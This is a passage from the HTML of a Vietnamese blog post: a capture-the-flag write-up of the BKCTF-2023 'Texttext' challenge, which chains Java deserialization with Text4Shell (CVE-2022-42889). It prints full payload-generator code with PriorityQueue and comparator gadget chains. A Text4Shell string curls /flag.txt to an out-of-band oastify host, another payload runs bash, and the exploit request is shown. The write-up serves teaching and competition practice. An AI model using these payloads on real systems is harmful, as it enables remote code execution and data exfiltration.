+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javassist.CtClass;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.beanutils.BeanComparator;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.shiro.crypto.AesCipherService;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.shiro.util.ByteSource;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.PriorityQueue;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// ... truncated</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">getPayload</span>(<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> clazzBytes) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>    TemplatesImpl obj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>    setFieldValue(obj, <span style="color:#e6db74">&#34;_bytecodes&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{clazzBytes});
+</span></span><span style="display:flex;"><span>    setFieldValue(obj, <span style="color:#e6db74">&#34;_name&#34;</span>, <span style="color:#e6db74">&#34;HelloTemplatesImpl&#34;</span>);
+</span></span><span style="display:flex;"><span>    setFieldValue(obj, <span style="color:#e6db74">&#34;_tfactory&#34;</span>, <span style="color:#66d9ef">new</span> TransformerFactoryImpl());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    AttrNSImpl attrNS1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> AttrNSImpl(<span style="color:#66d9ef">new</span> CoreDocumentImpl(),<span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#e6db74">&#34;1&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">final</span> BeanComparator comparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BeanComparator(<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">new</span> AttrCompare());
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">final</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span>(2, comparator);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// stub data for replacement later</span>
+</span></span><span style="display:flex;"><span>    queue.<span style="color:#a6e22e">add</span>(attrNS1);
+</span></span><span style="display:flex;"><span>    queue.<span style="color:#a6e22e">add</span>(attrNS1);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    setFieldValue(comparator, <span style="color:#e6db74">&#34;property&#34;</span>, <span style="color:#e6db74">&#34;outputProperties&#34;</span>);
+</span></span><span style="display:flex;"><span>    setFieldValue(queue, <span style="color:#e6db74">&#34;queue&#34;</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{obj, obj});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ByteArrayOutputStream barr <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>    ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(barr);
+</span></span><span style="display:flex;"><span>    oos.<span style="color:#a6e22e">writeObject</span>(queue);
+</span></span><span style="display:flex;"><span>    oos.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> barr.<span style="color:#a6e22e">toByteArray</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Chain gọi đến <code>Object#compare()</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>PriorityQueue.<span style="color:#a6e22e">readObject</span>()
+</span></span><span style="display:flex;"><span>    PriorityQueue.<span style="color:#a6e22e">heapify</span>()
+</span></span><span style="display:flex;"><span>        PriorityQueue.<span style="color:#a6e22e">siftDown</span>()
+</span></span><span style="display:flex;"><span>            PriorityQueue.<span style="color:#a6e22e">siftDownUsingComparator</span>()
+</span></span><span style="display:flex;"><span>                BeanComparator.<span style="color:#a6e22e">compare</span>()
+</span></span></code></pre></div><p>Class <code>BeanComparator</code> nằm trong lib <code>commons-beanutils</code> không có trong classpath trong challenge này nên không thể sử dụng. Tại đây mình chỉ việc thay <code>BeanComparator</code> thành <code>ObjectToStringComparator</code> trong <code>commons-lang</code> là xong :)</p>
+<p>Full script test/gen payload của mình: <code>Main.java</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.text.controller.Player;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.lang3.compare.ObjectToStringComparator;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import static</span> ysoserial.payloads.util.Reflections.setFieldValue;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.*;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.net.URLEncoder;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.charset.StandardCharsets;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Base64;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.PriorityQueue;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Main</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">deserMe</span>(String player) { <span style="color:#75715e">// testing purpose</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> data <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">getDecoder</span>().<span style="color:#a6e22e">decode</span>(player);
+</span></span><span style="display:flex;"><span>            InputStream is <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(data);
+</span></span><span style="display:flex;"><span>            ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(is);
+</span></span><span style="display:flex;"><span>            Object obj <span style="color:#f92672">=</span> ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>            ois.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>            Player user <span style="color:#f92672">=</span> (Player)obj;
+</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;&lt;h1&gt; Hello: &#34;</span> <span style="color:#f92672">+</span> user.<span style="color:#a6e22e">getName</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; !&lt;/h1&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception var10) {
+</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;&lt;h1&gt; ????????? &lt;/h1&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            String name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;${script:js:new java.lang.ProcessBuilder(\&#34;curl\&#34;,\&#34;r1t8ync67yj303id7vmfs35wyn4gs8gx.oastify.com\&#34;,\&#34;-d\&#34;,\&#34;@/flag.txt\&#34;).start()}&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// dùng java reflection để khởi tạo Player object, set các private fields</span>
+</span></span><span style="display:flex;"><span>            Class<span style="color:#f92672">&lt;?&gt;</span> clazz <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;com.text.controller.Player&#34;</span>);
+</span></span><span style="display:flex;"><span>            Object obj <span style="color:#f92672">=</span> clazz.<span style="color:#a6e22e">newInstance</span>();
+</span></span><span style="display:flex;"><span>            Field f1 <span style="color:#f92672">=</span> obj.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;name&#34;</span>);
+</span></span><span style="display:flex;"><span>            f1.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>            f1.<span style="color:#a6e22e">set</span>(obj, name);
+</span></span><span style="display:flex;"><span>            Field f2 <span style="color:#f92672">=</span> obj.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;isAdmin&#34;</span>);
+</span></span><span style="display:flex;"><span>            f2.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>            f2.<span style="color:#a6e22e">set</span>(obj, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// build gadget chain gọi đến ObjectToStringComparator#compare()</span>
+</span></span><span style="display:flex;"><span>            AttrNSImpl attrNS1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> AttrNSImpl(<span style="color:#66d9ef">new</span> CoreDocumentImpl(),<span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#e6db74">&#34;1&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">final</span> ObjectToStringComparator comparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span>  ObjectToStringComparator();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">final</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span>(2, comparator);
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// stub data for replacement later</span>
+</span></span><span style="display:flex;"><span>            queue.<span style="color:#a6e22e">add</span>(attrNS1);
+</span></span><span style="display:flex;"><span>            queue.<span style="color:#a6e22e">add</span>(attrNS1);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            setFieldValue(queue, <span style="color:#e6db74">&#34;queue&#34;</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{obj, obj}); <span style="color:#75715e">// Player#toString</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            ByteArrayOutputStream barr <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>            ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(barr);
+</span></span><span style="display:flex;"><span>            oos.<span style="color:#a6e22e">writeObject</span>(queue);
+</span></span><span style="display:flex;"><span>            oos.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes <span style="color:#f92672">=</span> barr.<span style="color:#a6e22e">toByteArray</span>();
+</span></span><span style="display:flex;"><span>            String a <span style="color:#f92672">=</span>  Base64.<span style="color:#a6e22e">getEncoder</span>().<span style="color:#a6e22e">encodeToString</span>(bytes);
+</span></span><span style="display:flex;"><span>            String b <span style="color:#f92672">=</span> URLEncoder.<span style="color:#a6e22e">encode</span>(a, StandardCharsets.<span style="color:#a6e22e">UTF_8</span>.<span style="color:#a6e22e">toString</span>());
+</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(b);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// deserMe(a);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e) {
+</span></span><span style="display:flex;"><span>            e.<span style="color:#a6e22e">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Gửi request:</p>
+<pre tabindex="0"><code>GET /text/get-name?player=&lt;serialized_string&gt; HTTP/1.1
+Host: 18.141.143.171:30098
+</code></pre><p>Hihi:
+<img src="/images/2023/BKCTF-2023_Texttext/flag.png" alt="flag"></p>
+<h2 id="badattributevalueexpexception-solution">BadAttributeValueExpException solution</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Player player <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Player();
+</span></span><span style="display:flex;"><span>Field isAdmin <span style="color:#f92672">=</span> Player.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;isAdmin&#34;</span>);
+</span></span><span style="display:flex;"><span>isAdmin.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>isAdmin.<span style="color:#a6e22e">setBoolean</span>(player, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>Field name <span style="color:#f92672">=</span> Player.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;name&#34;</span>);
+</span></span><span style="display:flex;"><span>name.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>name.<span style="color:#a6e22e">set</span>(player, <span style="color:#e6db74">&#34;${script:javascript:java.lang.Runtime.getRuntime().exec([&#39;/bin/bash&#39;, &#39;-c&#39;, &#39;touch /tmp/zzzzz&#39;])}&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BadAttributeValueExpException badAttributeValueExpException <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BadAttributeValueExpException(<span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>Field val <span style="color:#f92672">=</span> badAttributeValueExpException.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;val&#34;</span>);
+</span></span><span style="display:flex;"><span>val.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>val.<span style="color:#a6e22e">set</span>(badAttributeValueExpException, player);
+</span></span></code></pre></div><p><code>BadAttributeValueExpException</code> được sử dụng trong 1 chain rất phổ biến là <a href="https://sec.vnpt.vn/2020/02/the-art-of-deserialization-gadget-hunting-part-2/">CommonsCollection5</a> để gọi đến <code>TiedMapEntry#toString()</code>, mình lâu không mò lại deser cũng quên luôn chain này, nhớ ra từ sớm chắc ngon ăn hơn rồi (-0-).</p>
+<p><img src="/images/2023/BKCTF-2023_Texttext/note_vnpt.png" alt="note_vnpt"></p>
+<h2 id="refs">refs</h2>
+<ul>
+<li><a href="https://securitylab.github.com/advisories/GHSL-2022-018_Apache_Commons_Text/">https://securitylab.github.com/advisories/GHSL-2022-018_Apache_Commons_Text/</a></li>
+<li><a href="https://checkmarx.com/blog/cve-2022-42889-text4shell-vulnerability-breakdown/">https://checkmarx.com/blog/cve-2022-42889-text4shell-vulnerability-breakdown/</a></li>
+<li><a href="https://www.paloaltonetworks.com/blog/prisma-cloud/analysis_of_cve-2022-42889_text4shell_vulnerability/">https://www.paloaltonetworks.com/blog/prisma-cloud/analysis_of_cve-2022-42889_text4shell_vulnerability/</a></li>
+<li><a href="https://paper.seebug.org/1839/">https://paper.seebug.org/1839/</a></li>
+</ul>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/posts">Archives</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/about">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#preface">Preface</a></li>
+    <li><a href="#overview">Overview</a>
+      <ul>
+        <li><a href="#dockerfile">Dockerfile</a></li>
+        <li><a href="#review-source-code">Review source-code</a></li>
+      </ul>
+    </li>
+    <li><a href="#cve-2022-42889---rce-in-apache-commons-text">CVE-2022-42889 - RCE in Apache Commons Text</a></li>
+    <li><a href="#playertostring">Player#toString</a></li>
+    <li><a href="#badattributevalueexpexception-solution">BadAttributeValueExpException solution</a></li>
+    <li><a href="#refs">refs</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fbkctf-2023_texttext%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fbkctf-2023_texttext%2f&text=BKCTF-2023%20Ctf%20Writeup%20-%20Texttext%20-%20Java%20deser%20exploit%20Text4Shell" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fbkctf-2023_texttext%2f&title=BKCTF-2023%20Ctf%20Writeup%20-%20Texttext%20-%20Java%20deser%20exploit%20Text4Shell" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fbkctf-2023_texttext%2f&is_video=false&description=BKCTF-2023%20Ctf%20Writeup%20-%20Texttext%20-%20Java%20deser%20exploit%20Text4Shell" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=BKCTF-2023%20Ctf%20Writeup%20-%20Texttext%20-%20Java%20deser%20exploit%20Text4Shell&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fbkctf-2023_texttext%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fbkctf-2023_texttext%2f&title=BKCTF-2023%20Ctf%20Writeup%20-%20Texttext%20-%20Java%20deser%20exploit%20Text4Shell" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fbkctf-2023_texttext%2f&title=BKCTF-2023%20Ctf%20Writeup%20-%20Texttext%20-%20Java%20deser%20exploit%20Text4Shell" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fbkctf-2023_texttext%2f&name=BKCTF-2023%20Ctf%20Writeup%20-%20Texttext%20-%20Java%20deser%20exploit%20Text4Shell&description=Preface%20Tu%e1%ba%a7n%20v%e1%bb%aba%20r%e1%bb%93i%20m%c3%acnh%20c%c3%b3%20tham%20gia%20gi%e1%ba%a3i%20BKCTF-2023%20%e1%bb%9f%20b%e1%ba%a3ng%20offline%2c%20th%c3%a0nh%20t%c3%adch%20team%20th%c3%ac%20c%c5%a9ng%20kh%c3%b4ng%20c%c3%b3%20g%c3%ac%20n%e1%bb%95i%20b%e1%ba%adt%20nh%c6%b0ng%20trong%20gi%e1%ba%a3i%20m%c3%acnh%20c%c3%b3%20gi%e1%ba%a3i%20%c4%91%c6%b0%e1%bb%a3c%20m%e1%bb%99t%20b%c3%a0i%20c%c5%a9ng%20kh%c3%a1%20hay%20d%c3%b9%20kh%c3%b4ng%20qu%c3%a1%20kh%c3%b3%20l%c3%a0%20b%c3%a0i%20Texttext%2c%20khi%20nh%e1%ba%adn%20gi%e1%ba%a3i%20%c4%91%c6%b0%e1%bb%a3c%20y%c3%aau%20c%e1%ba%a7u%20vi%e1%ba%bft%20writeup%20n%c3%aan%20yup%2c%20%c4%91%c3%a2y%20ch%c3%adnh%20l%c3%a0%20n%c3%b3.%0aOverview%20Challenge%20cho%20source-code%2c%20c%c3%a1c%20b%e1%ba%a1n%20c%c3%b3%20th%e1%bb%83%20t%e1%ba%a3i%20t%e1%ba%a1i%3a%20https%3a%2f%2fdrive.google.com%2ffile%2fd%2f1onNxUHArYn3KTR3YJ8bKPykSDDm7kkMG%2fview%3fusp%3ddrive_link%0aSau%20khi%20t%e1%ba%a3i%20v%e1%bb%81%20%c4%91%c6%b0%e1%bb%a3c%201%20file%20l%c3%a0%20textext." aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fbkctf-2023_texttext%2f&t=BKCTF-2023%20Ctf%20Writeup%20-%20Texttext%20-%20Java%20deser%20exploit%20Text4Shell" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2024  devme4f blogs 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Archives</a></li>
+         
+        <li><a href="/tags">Tags</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+<script src=/js/code-copy.js></script>
+
+
+
+
+</html>
